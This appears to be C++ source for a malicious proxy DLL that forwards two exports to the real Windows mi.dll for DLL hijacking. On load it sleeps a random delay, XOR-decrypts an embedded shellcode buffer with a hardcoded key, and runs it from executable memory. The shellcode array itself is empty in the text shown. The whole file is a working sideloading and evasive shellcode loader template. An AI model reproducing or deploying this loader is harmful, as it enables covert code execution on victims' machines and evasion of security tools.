// DLL Proxy
#include <windows.h>
#include <Shellapi.h>
#include <tchar.h>
#include "pch.h"
#include <stdio.h>
#include <thread>
#include "direct.h"
#include <Shlobj.h>
#include <Shlwapi.h>

#pragma comment(linker, "/export:MI_Application_InitializeV1=C:\\Windows\\System32\\mi.MI_Application_InitializeV1")
#pragma comment(linker, "/export:mi_clientFT_V1=C:\\Windows\\System32\\mi.mi_clientFT_V1")

void Hook_Init();
std::thread hookthread;
char shellcode[] = \

;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH: {
		srand(clock());
		int num = ((rand() % (100 - 1 + 1)) + 1) * 200;
		Sleep(num);
		char key[] = "a6Pzfg5WCfuWvCsjvHZha*#YR&zhQnU5v@bZ8&hV!repq6fouf^q#";
		int keysize = sizeof(key);
		int i;
		for (i = 0; i < sizeof(shellcode); i++) {
			shellcode[i] = key[i % keysize] ^ shellcode[i];
		}
		hookthread = std::thread(Hook_Init);
	}
	case DLL_PROCESS_DETACH:
		hookthread.detach();
		// Code to run when the DLL is freed
		break;

	case DLL_THREAD_ATTACH:
		// Code to run when a thread is created during the DLL's lifetime
		break;
	case DLL_THREAD_DETACH:
		// Code to run when a thread ends normally.
		break;
	}
	return TRUE;
}

void Hook_Init() {
	void* pShellcode;
	HANDLE hProcess = GetCurrentProcess();

	pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pShellcode, shellcode, sizeof(shellcode));

	int (*func)();
	func = (int (*)()) pShellcode;
	(*func)();
}
